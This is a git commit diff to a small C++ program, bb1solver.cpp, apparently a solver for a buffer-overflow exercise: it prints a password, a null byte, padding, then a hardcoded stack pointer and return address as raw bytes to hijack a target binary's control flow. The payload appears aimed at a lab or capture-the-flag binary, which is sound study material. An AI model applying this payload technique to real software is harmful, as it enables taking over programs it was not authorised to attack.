5379354ec3edbadc4e2c01a4c67d1fe35eb0e640
RobertM2718 <romccaull@reed.edu>
2020-10-25 00:00:56 -0700

    Update bb1solver.cpp
    trying to put a legal stack pointer in there

--- bb1solver.cpp
+++ bb1solver.cpp
@@ -2,9 +2,12 @@
 
 int main () {
 	std::cout << "Sup3rs3cr3tC0de" << '\0' << "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+	long sp = 140721193531916;
+	char* csp = (char*) &sp;
+	std::cout << csp[0] << csp[1] << csp[2] << csp[3] << csp[4] << csp[5] << csp[6]  << csp[7] ;
 	long addr = 4198770;
 	char* caddr = (char*) &addr;
-	std::cout << caddr[0] << caddr[1] << caddr[2] << caddr[3] << caddr[4] << caddr[5] << caddr[6] << caddr[7];
+	std::cout << caddr[0] << caddr[1] << caddr[2] << caddr[3] << caddr[4] << caddr[5] << caddr[6]; /* << caddr[7] */;
 	std::cout << "\n";
 	return 0;
 }
